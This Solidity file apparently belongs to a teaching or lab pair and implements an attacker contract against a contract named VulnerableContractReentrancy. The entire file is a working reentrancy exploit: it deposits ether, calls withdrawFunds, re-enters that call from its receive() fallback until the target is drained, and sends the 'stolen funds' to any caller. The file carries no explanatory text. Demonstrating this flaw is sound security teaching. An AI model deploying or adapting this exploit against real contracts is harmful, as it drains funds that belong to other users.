// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableContractReentrancy.sol";

contract AttackerContractReentrancy {
    VulnerableContractReentrancy public vulnerableContract;
    uint256 public constant WITHDRAW_AMOUNT = 1 ether;
    
    constructor(address _vulnerableContract) {
        vulnerableContract = VulnerableContractReentrancy(_vulnerableContract);
    }
    
    function attack() external payable {
        require(msg.value >= WITHDRAW_AMOUNT, "Need initial funds");
        
        vulnerableContract.depositFunds{value: WITHDRAW_AMOUNT}();
        
        vulnerableContract.withdrawFunds(WITHDRAW_AMOUNT);
    }
    
    // Fallback function that gets triggered when receiving ETH
    receive() external payable {
        if (address(vulnerableContract).balance >= WITHDRAW_AMOUNT) {
            vulnerableContract.withdrawFunds(WITHDRAW_AMOUNT);
        }
    }
    
    function withdrawStolenFunds() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}